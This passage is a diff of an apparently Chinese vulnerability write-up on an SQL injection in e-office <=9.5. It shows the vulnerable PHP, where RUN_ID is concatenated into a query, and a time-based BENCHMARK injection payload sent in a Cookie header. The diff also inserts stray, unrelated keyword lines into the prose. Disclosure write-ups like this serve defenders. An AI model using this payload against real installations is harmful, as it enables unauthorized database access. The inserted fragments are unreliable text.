@@ -22,6 +22,8 @@ e-office <=9.5
 
 general/workflow/freerunimgflow.php 业务逻辑如下
 
+编程
+
 ```
 <?php
 
@@ -32,6 +34,14 @@ $connection = openconnection( );
 $sql = "\r\n        SELECT PRCS_ID FROM flow_run_prcs \r\n\t\t   WHERE RUN_ID=".$_REQUEST['RUN_ID']." \r\n\t\t     GROUP BY PRCS_ID ASC \r\n         ";
 $res = exequery( $connection, $sql );
 ```
+
+深入探索
+
+计算机安全
+
+商务软件和生产力软件
+
+业务流程
 
 `RUN_ID` 被直接拼接进SQL语句后执行，无任何过滤校验，造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")。
 
@@ -47,7 +57,7 @@ Cookie: RUN_ID=1 AND 9814=BENCHMARK(5000000,MD5(0x55615462))
 
 成功在延时 5 秒
 
-编程
+软件
 
 [sqlmap](https://mrxn.net/tag/sqlmap) 结果如下
 
